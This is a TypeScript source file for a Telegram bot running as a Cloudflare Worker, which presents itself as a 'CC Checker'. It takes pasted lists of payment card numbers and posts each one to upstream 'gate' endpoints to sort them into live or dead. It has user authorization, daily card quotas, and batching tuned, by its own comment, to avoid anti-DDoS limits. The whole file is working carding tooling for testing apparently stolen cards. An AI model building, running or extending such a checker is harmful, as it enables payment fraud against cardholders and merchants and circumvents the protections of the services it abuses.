import { Hono } from 'hono';
import { cors } from 'hono/cors';
import { Env, UpstreamResponse, TelegramUpdate, UserRecord } from './types';

const app = new Hono<Env>();

app.use('/*', cors({ origin: '*', allowMethods: ['POST', 'GET', 'OPTIONS'], maxAge: 86400 }));

// --- Core Utilities ---
const sanitizeInput = (input: string): string => input.replace(/[^\d\|]/g, '').trim();

const escapeHTML = (str: string): string => 
  str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');

const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

// --- Telegram Communication Service ---
async function sendTelegramMessage(token: string, chatId: number, text: string, replyToMessageId?: number) {
  const payload: any = {
    chat_id: chatId,
    text: text,
    parse_mode: 'HTML',
    disable_web_page_preview: true
  };
  if (replyToMessageId) payload.reply_to_message_id = replyToMessageId;

  const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
  
  if (!response.ok) {
    console.error(`Telegram API Error: ${await response.text()}`);
  }
}

// Telegram maximum message length is 4096. We use 4000 to be safe with HTML tags.
async function sendChunkedTelegramMessage(token: string, chatId: number, text: string, messageId?: number) {
  const MAX_LENGTH = 4000;
  if (text.length <= MAX_LENGTH) {
    return await sendTelegramMessage(token, chatId, text, messageId);
  }

  const lines = text.split('\n');
  let currentChunk = '';

  for (const line of lines) {
    if (currentChunk.length + line.length + 1 > MAX_LENGTH) {
      await sendTelegramMessage(token, chatId, currentChunk.trim(), messageId);
      currentChunk = '';
      await sleep(300); // Prevent Telegram rate limiting (429 Too Many Requests)
    }
    currentChunk += line + '\n';
  }

  if (currentChunk.trim().length > 0) {
    await sendTelegramMessage(token, chatId, currentChunk.trim(), messageId);
  }
}

// --- KV Access & Quota Service ---
const KV_USER_PREFIX = 'user:';
const KV_USAGE_PREFIX = 'usage:';

async function isAuthorized(kv: KVNamespace, userId: number, adminId: string): Promise<boolean> {
  if (userId.toString() === adminId) return true;
  return (await kv.get(`${KV_USER_PREFIX}${userId}`)) !== null;
}

const getSecondsUntilMidnightUTC = (): number => {
  const now = new Date();
  const tomorrow = new Date(now);
  tomorrow.setUTCHours(24, 0, 0, 0);
  return Math.max(60, Math.floor((tomorrow.getTime() - now.getTime()) / 1000));
};

async function consumeQuota(kv: KVNamespace, userId: number, cardsToProcess: number, limit: number): Promise<{ allowed: boolean; remaining: number }> {
  const dateStr = new Date().toISOString().split('T')[0];
  const usageKey = `${KV_USAGE_PREFIX}${userId}:${dateStr}`;
  
  const currentUsageStr = await kv.get(usageKey);
  const currentUsage = currentUsageStr ? parseInt(currentUsageStr, 10) : 0;
  
  if (currentUsage + cardsToProcess > limit) {
    return { allowed: false, remaining: Math.max(0, limit - currentUsage) };
  }
  
  const newUsage = currentUsage + cardsToProcess;
  await kv.put(usageKey, newUsage.toString(), { expirationTtl: getSecondsUntilMidnightUTC() });
  
  return { allowed: true, remaining: limit - newUsage };
}

async function getRemainingQuota(kv: KVNamespace, userId: number, limit: number): Promise<number> {
  const dateStr = new Date().toISOString().split('T')[0];
  const currentUsageStr = await kv.get(`${KV_USAGE_PREFIX}${userId}:${dateStr}`);
  const currentUsage = currentUsageStr ? parseInt(currentUsageStr, 10) : 0;
  return Math.max(0, limit - currentUsage);
}

// --- Upstream API Connector ---
async function checkSingleCard(url: string, payloadKey: string, card: string, timeoutStr: string, successCode: number): Promise<UpstreamResponse> {
  const upstreamBody = new URLSearchParams();
  if (payloadKey === 'ajax') {
    upstreamBody.append('ajax', '1');
    upstreamBody.append('do', 'check');
    upstreamBody.append('cclist', card);
  } else {
    upstreamBody.append(payloadKey, card);
  }

  const timeoutMs = parseInt(timeoutStr) || 5000;

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Referer": new URL(url).origin + "/"
      },
      body: upstreamBody.toString(),
      signal: AbortSignal.timeout(timeoutMs)
    });
    
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    const data = await response.json<any>();
    
    let status: UpstreamResponse['status'] = 'unknown';
    if (data.error === successCode) status = 'live';
    else if (data.error === 2) status = 'dead';
    
    const msg = data.msg ? data.msg.replace(/<[^>]*>?/gm, '').trim() : 'No response message';
    
    return { card, status, message: escapeHTML(msg) };
  } catch (e: any) {
    return { card, status: 'unknown', message: `Gateway Error` };
  }
}

// --- Telegram Webhook Lifecycle ---
app.get('/webhook/setup', async (c) => {
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_WEBHOOK_SECRET } = c.env;
  if (!TELEGRAM_BOT_TOKEN) return c.text("Error: TELEGRAM_BOT_TOKEN missing", 500);
  
  const webhookUrl = new URL(c.req.url).origin + '/webhook/telegram';
  const secret = TELEGRAM_WEBHOOK_SECRET || 'fallback_secret';
  
  const req = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook?url=${webhookUrl}&secret_token=${secret}`);
  return c.json(await req.json());
});

// --- Telegram Webhook Receiver ---
app.post('/webhook/telegram', async (c) => {
  const secretToken = c.req.header('X-Telegram-Bot-Api-Secret-Token');
  if (c.env.TELEGRAM_WEBHOOK_SECRET && secretToken !== c.env.TELEGRAM_WEBHOOK_SECRET) {
    return c.text('Unauthorized', 403);
  }

  try {
    const update = await c.req.json<TelegramUpdate>();
    if (!update.message?.text || !update.message.from) return c.text('OK');

    const chatId = update.message.chat.id;
    const userId = update.message.from.id;
    const messageId = update.message.message_id;
    const text = update.message.text.trim();
    const token = c.env.TELEGRAM_BOT_TOKEN;
    const isAdmin = userId.toString() === c.env.ADMIN_TELEGRAM_ID;
    const dailyLimit = parseInt(c.env.DAILY_CARD_LIMIT) || 100;

    if (text.startsWith('/start')) {
      const authorized = await isAuthorized(c.env.KV, userId, c.env.ADMIN_TELEGRAM_ID);
      const remaining = authorized ? await getRemainingQuota(c.env.KV, userId, dailyLimit) : 0;
      
      const welcomeText = `🤖 <b>Cloudflare Edge CC Checker</b>\n\n` +
        `🆔 User ID: <code>${userId}</code>\n` +
        `🛡 Status: ${authorized ? "✅ Authorized" : "❌ Denied"}\n` +
        `💳 Quota: ${remaining} / ${dailyLimit} cards\n\n` +
        `<b>Commands:</b>\n` +
        `<code>/chk1 &lt;cards&gt;</code> - Gate 1 (Payate CCN)\n` +
        `<code>/chk2 &lt;cards&gt;</code> - Gate 2 (Payate Mock)\n` +
        `<code>/me</code> - Check active quota`;
      
      await sendTelegramMessage(token, chatId, welcomeText, messageId);
      return c.text('OK');
    }

    if (isAdmin) {
      if (text.startsWith('/add ')) {
        const targetId = text.split(' ')[1];
        if (targetId && !isNaN(Number(targetId))) {
          await c.env.KV.put(`${KV_USER_PREFIX}${targetId}`, JSON.stringify({ role: 'user', addedAt: Date.now(), addedBy: userId }));
          await sendTelegramMessage(token, chatId, `✅ Authorized user <code>${targetId}</code>.`, messageId);
        }
        return c.text('OK');
      }
      if (text.startsWith('/remove ')) {
        const targetId = text.split(' ')[1];
        if (targetId) {
          await c.env.KV.delete(`${KV_USER_PREFIX}${targetId}`);
          await sendTelegramMessage(token, chatId, `🗑 Revoked user <code>${targetId}</code>.`, messageId);
        }
        return c.text('OK');
      }
    }

    if (!(await isAuthorized(c.env.KV, userId, c.env.ADMIN_TELEGRAM_ID))) {
      await sendTelegramMessage(token, chatId, "⛔️ <b>Access Denied</b>", messageId);
      return c.text('OK');
    }

    if (text === '/me' || text === '/stats') {
      const remaining = await getRemainingQuota(c.env.KV, userId, dailyLimit);
      await sendTelegramMessage(token, chatId, `📊 <b>Quota Remaining:</b> <b>${remaining}</b> / ${dailyLimit}\n<i>Resets daily at 00:00 UTC.</i>`, messageId);
      return c.text('OK');
    }

    const isApi1 = text.startsWith('/chk1 ');
    const isApi2 = text.startsWith('/chk2 ');

    if (isApi1 || isApi2) {
      const rawPayload = text.replace(/^\/chk[12] /, '');
      const validCards = rawPayload.split('\n')
        .map(line => sanitizeInput(line))
        .filter(line => line.length >= 12); 
      
      const cardCount = validCards.length;
      if (cardCount === 0) return c.text('OK'); // Ignore empty requests quietly

      const quota = await consumeQuota(c.env.KV, userId, cardCount, dailyLimit);
      
      if (!quota.allowed) {
        await sendTelegramMessage(token, chatId, `🛑 <b>Rate Limit Exceeded</b>\nRequested: ${cardCount}\nRemaining: ${quota.remaining}`, messageId);
        return c.text('OK');
      }

      const gateName = isApi1 ? "Gate 1" : "Gate 2";
      await sendTelegramMessage(token, chatId, `⏳ <i>Processing ${cardCount} cards in parallel batches via ${gateName}...</i>`, messageId);

      // Async Orchestration - Concurrency Controlled
      c.executionCtx.waitUntil((async () => {
        try {
          const results: string[] = [];
          const BATCH_SIZE = 5; // Process 5 cards concurrently to maximize speed without tripping anti-DDoS limits
          
          for (let i = 0; i < validCards.length; i += BATCH_SIZE) {
            const batch = validCards.slice(i, i + BATCH_SIZE);
            
            // Execute batch concurrently
            const batchPromises = batch.map(card => 
              isApi1 
                ? checkSingleCard(c.env.UPSTREAM_API1_URL, 'ajax', card, c.env.UPSTREAM_TIMEOUT_MS, 0)
                : checkSingleCard(c.env.UPSTREAM_API2_URL, 'data', card, c.env.UPSTREAM_TIMEOUT_MS, 1)
            );
            
            const batchResults = await Promise.all(batchPromises);
            
            for (const result of batchResults) {
               const emoji = result.status === 'live' ? '✅' : result.status === 'dead' ? '❌' : '⚠️';
               results.push(`${emoji} <code>${result.card}</code> - ${result.message}`);
            }
            
            // Short delay between batches to respect upstream stability
            if (i + BATCH_SIZE < validCards.length) await sleep(800);
          }

          // Safely chunk and transmit the final aggregated response
          const aggregatedMessage = `<b>[${gateName}] Final Report:</b>\n\n${results.join('\n')}\n\n<i>Quota Remaining: ${quota.remaining}</i>`;
          await sendChunkedTelegramMessage(token, chatId, aggregatedMessage, messageId);

        } catch (error: any) {
          await sendTelegramMessage(token, chatId, `⚠️ <b>Critical System Error:</b> ${escapeHTML(error.message)}`, messageId);
        }
      })());
    }

    return c.text('OK');
  } catch (error) {
    console.error("Fatal Webhook Error:", error);
    return c.text('OK'); 
  }
});

export default app;
